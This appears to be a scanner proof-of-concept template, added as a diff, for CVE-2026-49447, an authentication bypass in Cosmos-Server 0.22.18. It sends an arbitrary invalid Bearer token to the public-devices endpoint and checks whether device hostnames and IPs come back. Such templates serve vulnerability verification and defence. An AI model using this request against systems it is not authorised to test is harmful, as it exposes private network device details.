@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证Cosmos-Server 0.22.18中/public-devices端点的Bearer令牌绕过漏洞：发送任意非空Authorization头部即可获取Constellation设备元数据"
+id = "POC-AVE-2026-0699"
+name = "CVE-2026-49447 PoC"
+severity = "medium"
+tags = ["ave-2026-0699"]
+vuln_id = [
+    "CVE-2026-49447",
+    "AVE-2026-0699",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cosmos/api/constellation/public-devices"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer invalid-token-12345"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "device",
+    "hostname",
+    "ip",
+]
